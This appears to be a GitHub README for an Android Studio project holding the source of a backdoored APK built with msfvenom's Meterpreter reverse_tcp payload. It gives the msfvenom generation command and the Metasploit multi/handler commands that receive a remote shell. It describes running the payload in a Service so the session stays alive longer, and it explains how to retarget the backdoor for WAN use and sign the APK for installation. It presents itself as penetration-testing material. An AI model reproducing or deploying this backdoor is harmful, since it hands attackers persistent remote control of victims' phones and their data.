# msfvenom-backdoor-android
This Android Studio project contains the **source code of the backdoored .apk** generated by 
```
$msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.178.30 LPORT=4444 R > result.apk
```
(in Kali linux suite)

For an procedure guide of penetration into an Android system, please visit my website (Italian only) https://dragonitesec.wordpress.com/2016/11/06/tutorial-come-penetrare-in-un-telefono-android/

Tries to solve the issue:
```
[*]Meterpreter session x closed - Reason:died
```
message, by starting payload in a Service. Meterpreter session is more stable in this way (original msfvenom apk often causes session to die very soon)

In this project the backdoor works in **LAN** settings, opening a meterpreter session to 192.168.178.30 on port 4444
(this settings can be changed in **Payload.java** file if you want to work in a WAN)
The control server must be executing handler exploit with Metasploit, with following commands:
```
$msfconsole
$use exploit/multi/handler
$set payload android/meterpreter/reverse_tcp
$set LHOST 192.168.178.30
$set LPORT 4444
$exploit
```
after the metasploit machine is waiting, the .apk can be installed and launched on the android terminal.

**Remember to sign the .apk with a key before installing**

Tested on Samsung Galaxy S6 - Lollipop
